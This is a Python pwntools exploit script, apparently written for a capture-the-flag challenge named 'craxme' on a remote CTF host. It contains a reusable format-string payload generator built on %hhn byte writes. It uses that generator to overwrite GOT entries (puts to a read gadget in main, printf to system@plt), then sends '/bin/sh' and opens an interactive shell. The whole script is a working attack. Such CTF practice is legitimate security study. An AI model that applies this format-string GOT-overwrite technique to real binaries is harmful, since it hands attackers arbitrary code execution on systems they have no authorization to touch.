import math

from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']

class FMT:
    hhn = "%{}c%{}$hhn"
    hn  = "%{}c%{}$hn"
    n   = "%{}c%{}$n"
    lln = "%{}c%{}$lln"

    def __init__(self):
        self.buffer = []
        self.address = []
        self.fmt = []
        self.printed = 0

    def _append(self, address, fmt):
        self.address.append(address)
        self.fmt.append(fmt)

    def _fmt_width(self, offset, distance):
        width = 0
        for i, fmt in enumerate(self.fmt): width += len(fmt.format(offset + distance + i))
        return width

    def _write(self, address, value):
        # set one byte at a time ( 0x00000000000000?? to 0x??00000000000000 )
        for i in xrange(8):
            value_now = (value >> (8 * i)) & 0xff
            value_append = (value_now - self.printed + 0x100) % 0x100
            self.printed = value_now
            # can't write %0c, but we can write %256c
            if value_append == 0: value_append = 256
            self._append(address + i, self.hhn.format(value_append, "{}"))

    def __setitem__(self, address, value):
        self.buffer.append((address, value))

    def payload(self, offset, printed = 0):
        self.printed = printed
        for address, value in self.buffer: self._write(address, value)
        # calculate how far the distance between fmt and address is
        distance = 0
        while True:
            width = self._fmt_width(offset, distance)
            distance_new = int(math.ceil(width / 8.0))
            if distance == distance_new: break
            distance = distance_new

        # generate payload
        payload = ""
        for i, fmt in enumerate(self.fmt): payload += fmt.format(offset + distance + i)
        payload += "\x00" * (8 - len(payload) % 8)
        payload += "".join(map(p64, self.address))
        
        # reset
        self.printed = 0
        self.buffer = []
        self.address = []
        self.fmt = []

        return payload

system_plt = 0x4005a0
printf_got = 0x601030
puts_got = 0x601018
main_read = 0x400747

#r = process('./craxme')
#gdb.attach(proc.pidof(r)[0])
r = remote("csie.ctf.tw", 10134)

fmt = FMT()
fmt[puts_got] = main_read
r.send(fmt.payload(6).ljust(0x100, '\x00'))
fmt[printf_got] = system_plt
r.send(fmt.payload(7).ljust(0x100, '\x00'))
r.send("/bin/sh\x00")
r.interactive()
